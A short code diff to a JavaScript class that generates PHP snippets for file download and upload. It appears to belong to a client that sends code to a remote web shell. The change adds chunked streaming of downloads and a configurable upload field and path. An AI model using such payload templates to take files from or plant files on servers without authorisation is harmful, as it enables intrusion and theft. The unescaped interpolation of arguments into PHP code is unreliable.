@@ -42,17 +42,28 @@ export default class File {
 
     download() {
         return `
-        header('Content-Length:' . filesize('${this.arg1}'));
-        header('Content-Disposition:attachment;filename=' . basename('${this.arg1}'));
-        echo @file_get_contents('${this.arg1}');
+        $file = '${this.arg1}';
+        header('Content-Type: application/octet-stream');
+        header('Content-Disposition:attachment;filename=' . basename($file));
+        header('Content-Transfer-Encoding: binary');
+        header('Expires:0');
+        header('Content-Length:' . filesize($file));
+
+        set_time_limit(0);
+        $file = @fopen($file, 'rb');
+        while (!feof($file)) {
+            print(@fread($file, 1024 * 8));
+            ob_flush();
+            flush();
+        }
        `
     }
 
     upload() {
         return `
-        try {
-            if ($_FILES['file']['error']) echo 'ERROR://upload fail';
-            else move_uploaded_file($_FILES['file']['tmp_name'], '${this.arg1}');
+         try {
+            if ($_FILES['${this.arg1}']['error']) echo 'ERROR://upload fail';
+            else move_uploaded_file($_FILES['${this.arg1}']['tmp_name'], '${this.arg2}'.$_FILES['${this.arg1}']['name']);
         } catch (Exception $e) {
             echo 'ERROR://No Permission';
         }
